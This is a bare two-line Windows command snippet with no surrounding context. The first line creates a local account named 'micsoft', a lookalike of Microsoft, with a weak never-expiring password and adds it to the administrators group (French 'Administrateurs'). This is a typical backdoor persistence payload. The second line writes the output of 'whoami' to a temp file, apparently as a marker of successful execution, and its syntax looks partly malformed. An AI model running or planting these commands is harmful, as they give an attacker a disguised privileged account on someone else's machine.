net user micsoft passwd /add /y /expires:never "&" net localgroup Administrateurs micsoft /add
whoami | write-file $env:tmp\+"AAA_fileTEST.tx"
